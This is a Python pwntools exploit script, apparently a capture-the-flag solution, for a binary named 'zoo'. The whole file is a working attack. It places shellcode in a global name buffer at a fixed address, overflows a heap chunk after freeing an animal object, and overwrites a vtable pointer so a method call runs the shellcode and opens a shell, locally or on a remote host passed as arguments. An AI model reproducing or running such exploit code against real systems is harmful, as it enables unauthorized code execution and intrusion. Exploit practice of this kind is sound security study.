#!/usr/bin/env python
from pwn import *
import sys
context.log_level="debug"
#context.log_level="info"
code=ELF("./zoo",checksec=False)
context.terminal = ['gnome-terminal','-x','sh','-c']
context.arch = code.arch
if len(sys.argv)>2:
    con=remote(sys.argv[1],int(sys.argv[2]))
    libc=ELF("./libc.so")
elif len(sys.argv)>1:
    libc = ELF(sys.argv[1])
    con = code.process(env = {"LD_PRELOAD":sys.argv[1]})
else:
    con=code.process()
    if(context.arch == "amd64"):
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
    else:
        libc=ELF("/lib/i386-linux-gnu/libc.so.6")
def listen(index):
    con.sendlineafter("choice :","3")
    con.sendlineafter("animal : ",str(index))
def adddog(name):
    con.sendlineafter("choice :","1")
    con.sendafter("Name :",name)
    con.sendlineafter("Weight : ","1")
def remove(index):
    con.sendlineafter("choice :","5")
    con.sendlineafter("animal : ",str(index))

def z(commond=""):
    gdb.attach(con,commond)
def exploit():
    shellcode = asm(shellcraft.sh())
    name_addr = 0x605420
    vptr = name_addr+8
    name = "a"*8+p64(vptr+0x8)+shellcode
    con.sendlineafter("zoo :",name)
    adddog("a\n")
    adddog("a\n")
    remove(0)
    adddog("a"*0x48+p64(vptr)+"\n")
    listen(0)
exploit()
con.interactive()    
